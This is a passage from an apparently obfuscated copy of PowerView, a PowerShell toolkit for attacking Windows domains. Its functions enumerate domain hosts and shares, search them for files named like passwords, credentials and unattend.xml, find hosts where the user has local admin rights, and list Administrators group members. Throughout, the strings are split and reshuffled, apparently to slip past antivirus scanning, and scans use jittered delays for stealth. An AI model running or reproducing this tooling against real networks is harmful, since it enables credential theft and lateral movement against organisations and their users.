                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[("{2}{1}{0}"-f'tial','en','Cred')]) {
            if ($PSBoundParameters[("{0}{1}" -f 'Del','ay')] -or $PSBoundParameters[("{0}{2}{1}{3}"-f'StopOnSu','ces','c','s')]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{1}{0}"-f'y','Dela')] -or $PSBoundParameters[("{0}{2}{1}"-f'Stop','ess','OnSucc')]) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[Fin'+'d-Doma'+'inSha'+'r'+'e'+'] '+'D'+'ela'+'y: '+"$Delay, "+'Ji'+'t'+'ter: '+"$Jitter")
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose ('[Fi'+'nd'+'-D'+'omainSh'+'are]'+' '+'U'+'sing'+' '+'t'+'hreading'+' '+'wi'+'th '+'t'+'hrea'+'ds: '+"$Threads")

            
            $ScriptParams = @{
                ("{1}{3}{0}{2}"-f 'ces','Ch','s','eckShareAc') = $CheckShareAccess
                ("{0}{1}{2}{3}"-f'Toke','nHa','ndl','e') = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{1}{3}" -f'PS','oc','r','ess','ShouldP'}, '')]
    [OutputType({"{0}{3}{1}{2}" -f 'Pow','View.Fo','undFile','er'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}{2}{3}"-f'Fil','eSpeci','f','ication'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}{3}{2}" -f 'DNS','Host','ame','N'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}" -f 'Operati','t','em','ngSys'})]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}" -f'rvi','Se','Pack','ce'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Sit','me','eNa'})]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = "files`PECIfIc`A`TioN")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}"-f'S','er','ms','earchT'}, {"{0}{1}"-f'Te','rms'})]
        [String[]]
        $Include = @(("{1}{2}{0}" -f 'sword*','*','pas'), ("{1}{0}{2}"-f'sitiv','*sen','e*'), ("{0}{1}"-f'*ad','min*'), ("{0}{1}"-f '*login','*'), ("{1}{0}"-f'cret*','*se'), ("{1}{2}{3}{0}"-f 'xml','unat','tend','*.'), ("{1}{0}" -f'mdk','*.v'), ("{0}{1}" -f'*creds','*'), ("{1}{2}{3}{0}"-f '*','*cred','en','tial'), ("{1}{2}{0}" -f 'fig','*','.con')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({(("{0}{1}{3}{2}"-f 'UY','wUY','YwUYw','wU')).rePlACe(([chAr]85+[chAr]89+[chAr]119),[STRINg][chAr]92)})]
        [Alias({"{1}{0}" -f'are','Sh'})]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @('C$', ((('Ad'+'min'+'OvG') -REplAcE ([CHAR]79+[CHAR]118+[CHAR]71),[CHAR]36)), (('Print{0'+'}')-f  [cHAR]36), (('IP'+'CelN').rePlaCe('elN',[STrING][chAr]36))),

        [Parameter(ParameterSetName = "fI`LEspEc`i`FICA`TIoN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = "f`ilE`speCIf`i`caTioN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = "fILESPe`Ci`FI`cAt`ION")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = "oFFi`C`EdOcS")]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = "fRE`shEx`Es")]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{4}{0}"-f'r','a','Dom','inCon','trolle'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{1}{2}{0}" -f 'l','OneL','eve'}, {"{0}{2}{1}"-f'Su','ree','bt'})]
        [String]
        $SearchScope = ("{1}{0}{2}"-f'bt','Su','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ("{1}{2}{0}" -f 'rties','Pr','ope') = ("{2}{1}{3}{0}"-f 'e','ost','dnsh','nam')
        }
        if ($PSBoundParameters[("{3}{0}{1}{2}"-f 'omputerDom','a','in','C')]) { $ComputerSearcherArguments[("{1}{0}{2}" -f 'oma','D','in')] = $ComputerDomain }
        if ($PSBoundParameters[("{2}{3}{1}{0}"-f 'rLDAPFilter','te','Comp','u')]) { $ComputerSearcherArguments[("{2}{0}{1}"-f 'e','r','LDAPFilt')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[("{0}{2}{3}{1}{4}"-f 'Com','rS','pu','te','earchBase')]) { $ComputerSearcherArguments[("{0}{2}{1}" -f'Se','hBase','arc')] = $ComputerSearchBase }
        if ($PSBoundParameters[("{6}{0}{1}{3}{2}{4}{5}"-f 'om','puterOper','S','ating','yst','em','C')]) { $ComputerSearcherArguments[("{3}{4}{1}{2}{0}"-f 'em','t','ingSyst','Op','era')] = $OperatingSystem }
        if ($PSBoundParameters[("{5}{4}{3}{2}{0}{1}"-f'rServ','icePack','e','ut','omp','C')]) { $ComputerSearcherArguments[("{1}{2}{0}"-f'k','Ser','vicePac')] = $ServicePack }
        if ($PSBoundParameters[("{3}{4}{1}{0}{2}"-f'teN','terSi','ame','Comp','u')]) { $ComputerSearcherArguments[("{0}{1}{2}" -f'Site','Na','me')] = $SiteName }
        if ($PSBoundParameters[("{0}{1}"-f'Serve','r')]) { $ComputerSearcherArguments[("{1}{0}"-f 'rver','Se')] = $Server }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f'SearchS','e','op','c')]) { $ComputerSearcherArguments[("{2}{1}{0}"-f 'e','rchScop','Sea')] = $SearchScope }
        if ($PSBoundParameters[("{2}{1}{3}{0}{4}" -f 'geSi','su','Re','ltPa','ze')]) { $ComputerSearcherArguments[("{3}{2}{0}{1}"-f 'iz','e','PageS','Result')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{2}{1}{3}"-f'Server','meLi','Ti','mit')]) { $ComputerSearcherArguments[("{3}{0}{2}{1}" -f'r','rTimeLimit','ve','Se')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'e','bston','Tom')]) { $ComputerSearcherArguments[("{2}{1}{0}" -f 'ne','ombsto','T')] = $Tombstone }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'e','Cr','dential')]) { $ComputerSearcherArguments[("{0}{1}{2}{3}"-f'C','re','denti','al')] = $Credential }

        if ($PSBoundParameters[("{0}{2}{3}{1}" -f'Comp','ame','ut','erN')]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ("{11}{4}{3}{10}{1}{8}{0}{7}{2}{9}{5}{6}"-f'e]','nSha','Querying comp','gD','restin','ai','n',' ','reFil','uters in the dom','omai','[Find-Inte')
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ("{7}{10}{9}{3}{0}{8}{2}{11}{12}{1}{5}{4}{6}"-f 'inShareFile] No h','ound to ','t','ma','erat','enum','e','[Find-Inte','os','estingDo','r','s ','f')
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                            
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                
                                if ($ExcludedShares -NotContains $ShareName) {
                                    
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose ('['+'!] '+'N'+'o '+'acc'+'ess '+'to'+' '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                    Write-Verbose ('Searchin'+'g'+' '+'sh'+'are:'+' '+"$Share")
                    $SearchArgs = @{
                        ("{1}{0}" -f'ath','P') = $Share
                        ("{1}{0}{2}"-f'u','Incl','de') = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs[("{0}{2}{1}"-f 'Of','eDocs','fic')] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs[("{1}{3}{2}{0}" -f'hEXEs','Fr','s','e')] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs[("{2}{3}{0}{1}" -f 'T','ime','Last','Access')] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs[("{0}{1}{2}"-f 'Las','tWriteTim','e')] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs[("{0}{2}{1}"-f'Creati','me','onTi')] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs[("{2}{1}{0}"-f'eAccess','Writ','Check')] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[("{2}{1}{0}"-f 'ial','edent','Cr')]) {
            if ($PSBoundParameters[("{1}{0}"-f 'y','Dela')] -or $PSBoundParameters[("{1}{0}{2}" -f 'OnSucces','Stop','s')]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{0}{1}"-f'D','elay')] -or $PSBoundParameters[("{0}{2}{1}" -f'StopOn','ss','Succe')]) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[F'+'i'+'nd'+'-I'+'nteres'+'ti'+'ngDomai'+'nShar'+'eF'+'ile] '+'Delay:'+' '+"$Delay, "+'Jitte'+'r:'+' '+"$Jitter")
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose ('[Fi'+'nd-I'+'nter'+'esting'+'Do'+'mai'+'nShareFile] '+'Us'+'ing '+'thre'+'ading'+' '+'w'+'ith '+'thr'+'eads:'+' '+"$Threads")

            
            $ScriptParams = @{
                ("{2}{0}{1}"-f'nc','lude','I') = $Include
                ("{1}{2}{3}{0}" -f 'hares','Excl','ude','dS') = $ExcludedShares
                ("{3}{2}{0}{1}"-f 'oc','s','eD','Offic') = $OfficeDocs
                ("{1}{3}{0}{2}"-f 'ude','E','Hidden','xcl') = $ExcludeHidden
                ("{2}{0}{1}"-f'E','s','FreshEX') = $FreshEXEs
                ("{2}{4}{3}{0}{1}"-f 'Acces','s','Chec','ite','kWr') = $CheckWriteAccess
                ("{1}{0}{2}" -f 'an','TokenH','dle') = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}" -f 'dProces','houl','PSS','s'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{1}{0}"-f'me','Na','DNSHost'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}"-f'OperatingS','ys','t','em'})]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}"-f 'S','cePack','er','vi'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'eName','S','it'})]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}{4}" -f'ntr','olle','ainCo','Dom','r'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{1}{0}" -f 'vel','OneLe'}, {"{0}{2}{1}" -f 'Subtr','e','e'})]
        [String]
        $SearchScope = ("{0}{1}"-f 'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ("{2}{1}{0}"-f 'perties','ro','P') = ("{0}{1}{2}" -f 'dns','hostnam','e')
        }
        if ($PSBoundParameters[("{2}{1}{0}" -f'Domain','mputer','Co')]) { $ComputerSearcherArguments[("{1}{0}" -f'in','Doma')] = $ComputerDomain }
        if ($PSBoundParameters[("{5}{3}{4}{2}{0}{1}" -f 't','er','il','omputerLDAP','F','C')]) { $ComputerSearcherArguments[("{3}{0}{2}{1}"-f'D','er','APFilt','L')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[("{0}{2}{3}{1}" -f'Com','Base','puterSe','arch')]) { $ComputerSearcherArguments[("{2}{0}{1}" -f'earchB','ase','S')] = $ComputerSearchBase }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'Uncon','stra','ined')]) { $ComputerSearcherArguments[("{3}{1}{2}{0}{4}"-f 'n','nc','onstrai','U','ed')] = $Unconstrained }
        if ($PSBoundParameters[("{5}{3}{0}{4}{6}{1}{2}" -f 'ra','yst','em','rOpe','t','Compute','ingS')]) { $ComputerSearcherArguments[("{0}{4}{2}{3}{1}"-f'Op','em','atingS','yst','er')] = $OperatingSystem }
        if ($PSBoundParameters[("{2}{1}{0}{3}"-f'puterServic','m','Co','ePack')]) { $ComputerSearcherArguments[("{3}{2}{0}{1}" -f'ac','k','rviceP','Se')] = $ServicePack }
        if ($PSBoundParameters[("{2}{0}{3}{1}" -f'rSiteN','me','Compute','a')]) { $ComputerSearcherArguments[("{0}{1}" -f'S','iteName')] = $SiteName }
        if ($PSBoundParameters[("{0}{1}"-f 'Ser','ver')]) { $ComputerSearcherArguments[("{1}{0}"-f'rver','Se')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}"-f 'SearchS','pe','co')]) { $ComputerSearcherArguments[("{0}{1}{2}"-f'Se','archS','cope')] = $SearchScope }
        if ($PSBoundParameters[("{2}{4}{1}{0}{3}" -f'PageSi','t','R','ze','esul')]) { $ComputerSearcherArguments[("{4}{2}{0}{3}{1}" -f'ultP','eSize','s','ag','Re')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{3}{4}{2}{1}" -f'Ser','it','im','v','erTimeL')]) { $ComputerSearcherArguments[("{1}{3}{2}{0}"-f'Limit','S','ime','erverT')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{0}" -f 'e','Tombston')]) { $ComputerSearcherArguments[("{0}{1}{2}" -f'To','mbsto','ne')] = $Tombstone }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'edential','r','C')]) { $ComputerSearcherArguments[("{0}{1}{2}" -f 'Cred','entia','l')] = $Credential }

        if ($PSBoundParameters[("{1}{2}{3}{0}" -f 'rName','C','omp','ute')]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ("{16}{12}{0}{1}{10}{8}{7}{4}{2}{9}{6}{11}{15}{5}{3}{14}{13}"-f'al','Ad','ss','m','cce','do','omput','A','in','] Querying c','m','ers in','d-Loc','n','ai',' the ','[Fin')
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ("{1}{9}{2}{4}{7}{6}{11}{0}{5}{8}{10}{3}"-f'o en','[Find','calAdmin','ate','Acces','u',' No','s]','m','-Lo','er',' hosts found t')
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[("{0}{1}{2}"-f 'Cr','edenti','al')]) {
            if ($PSBoundParameters[("{0}{1}"-f'Dela','y')] -or $PSBoundParameters[("{3}{0}{2}{1}" -f 'Su','s','cces','StopOn')]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{0}{1}"-f 'Del','ay')] -or $PSBoundParameters[("{1}{0}{3}{2}{4}"-f 'opOn','St','ces','Suc','s')]) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[F'+'ind'+'-LocalAd'+'minAccess'+']'+' '+'Dela'+'y:'+' '+"$Delay, "+'Jitt'+'er'+': '+"$Jitter")
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose ('[F'+'ind-LocalAd'+'minAcces'+'s]'+' '+'Usi'+'ng'+' '+'thread'+'ing'+' '+'w'+'ith '+'thre'+'a'+'ds: '+"$Threads")

            
            $ScriptParams = @{
                ("{3}{1}{0}{2}"-f'l','enHand','e','Tok') = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{2}{1}{0}" -f 'cess','o','ldPr','SShou','P'}, '')]
    [OutputType({"{0}{1}{4}{3}{5}{2}"-f 'P','o','Member.API','erView.Loca','w','lGroup'})]
    [OutputType({"{0}{4}{6}{1}{7}{5}{3}{2}"-f 'P','iew.','upMember.WinNT','o','owe','r','rV','LocalG'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{1}{0}" -f'me','Na','DNSHost'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}"-f 'Opera','m','tingSy','ste'})]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'rvic','Se','ePack'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'me','eNa','Sit'})]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = ("{2}{1}{4}{0}{3}" -f'or','nis','Admi','s','trat'),

        [ValidateSet('API', {"{1}{0}"-f'T','WinN'})]
        [Alias({"{3}{2}{1}{0}" -f'd','ho','ionMet','Collect'})]
        [String]
        $Method = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}" -f 'r','Domai','e','nControll'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{1}{2}"-f 'O','neLeve','l'}, {"{0}{1}{2}"-f'Sub','tr','ee'})]
        [String]
        $SearchScope = ("{1}{0}"-f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ("{2}{1}{0}" -f 'erties','op','Pr') = ("{1}{0}{2}{3}"-f'sh','dn','os','tname')
        }
        if ($PSBoundParameters[("{0}{1}{3}{2}" -f'Co','mpute','n','rDomai')]) { $ComputerSearcherArguments[("{1}{0}{2}"-f 'omai','D','n')] = $ComputerDomain }
        if ($PSBoundParameters[("{4}{3}{5}{2}{0}{1}" -f'PFi','lter','DA','pu','Com','terL')]) { $ComputerSearcherArguments[("{1}{0}{2}{3}"-f'D','L','APF','ilter')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[("{0}{2}{1}{3}{4}"-f'ComputerS','h','earc','Ba','se')]) { $ComputerSearcherArguments[("{1}{0}{2}" -f'archBas','Se','e')] = $ComputerSearchBase }
        if ($PSBoundParameters[("{0}{3}{1}{2}"-f 'Unc','nstr','ained','o')]) { $ComputerSearcherArguments[("{2}{1}{0}{4}{3}" -f't','ns','Unco','ained','r')] = $Unconstrained }
        if ($PSBoundParameters[("{4}{0}{2}{3}{5}{1}"-f'te','m','rOpe','rati','Compu','ngSyste')]) { $ComputerSearcherArguments[("{3}{2}{1}{0}" -f'em','Syst','erating','Op')] = $OperatingSystem }
        if ($PSBoundParameters[("{3}{1}{5}{4}{2}{0}"-f 'ack','o','ServiceP','C','er','mput')]) { $ComputerSearcherArguments[("{0}{3}{1}{2}"-f 'S','vi','cePack','er')] = $ServicePack }
        if ($PSBoundParameters[("{2}{4}{1}{3}{0}"-f'rSiteName','pu','Co','te','m')]) { $ComputerSearcherArguments[("{2}{0}{1}"-f'i','teName','S')] = $SiteName }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Se','r','ver')]) { $ComputerSearcherArguments[("{2}{1}{0}"-f 'er','erv','S')] = $Server }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'Scop','Search','e')]) { $ComputerSearcherArguments[("{2}{1}{3}{0}"-f 'cope','ear','S','chS')] = $SearchScope }
        if ($PSBoundParameters[("{4}{2}{0}{1}{3}"-f 'a','geS','ltP','ize','Resu')]) { $ComputerSearcherArguments[("{3}{4}{2}{1}{0}"-f 'ize','S','age','Resul','tP')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{3}{1}{4}{2}" -f'ServerT','m','mit','i','eLi')]) { $ComputerSearcherArguments[("{4}{3}{2}{1}{0}"-f't','i','m','verTimeLi','Ser')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'one','T','ombst')]) { $ComputerSearcherArguments[("{2}{0}{1}"-f 'sto','ne','Tomb')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'redentia','l','C')]) { $ComputerSearcherArguments[("{0}{3}{2}{1}" -f'C','l','ia','redent')] = $Credential }

        if ($PSBoundParameters[("{0}{2}{3}{1}" -f 'Co','ame','m','puterN')]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ("{4}{16}{8}{11}{13}{9}{2}{15}{3}{1}{5}{6}{12}{14}{0}{7}{10}"-f't','ryi','GroupMember]','Que','[','ng com','p','he doma','Do','inLocal','in','m','ute','a','rs in ',' ','Find-')
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ("{3}{2}{1}{7}{6}{5}{8}{0}{4}{9}" -f' found','Loc','ain','[Find-Dom',' to enume','ost','o h','alGroupMember] N','s','rate')
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            
            if ($GroupName -eq ("{3}{4}{1}{2}{0}" -f's','o','r','Administr','at')) {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        ("{0}{2}{3}{1}" -f 'Co','ame','m','puterN') = $TargetComputer
                        ("{2}{1}{0}"-f'od','th','Me') = $Method
                        ("{2}{0}{1}" -f'up','Name','Gro') = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[("{0}{1}{2}"-f 'Cr','edent','ial')]) {
            if ($PSBoundParameters[("{1}{0}" -f 'y','Dela')] -or $PSBoundParameters[("{1}{0}{2}"-f 'opOnSucce','St','ss')]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{0}{1}" -f 'Dela','y')] -or $PSBoundParameters[("{2}{3}{1}{0}" -f 'Success','n','St','opO')]) {

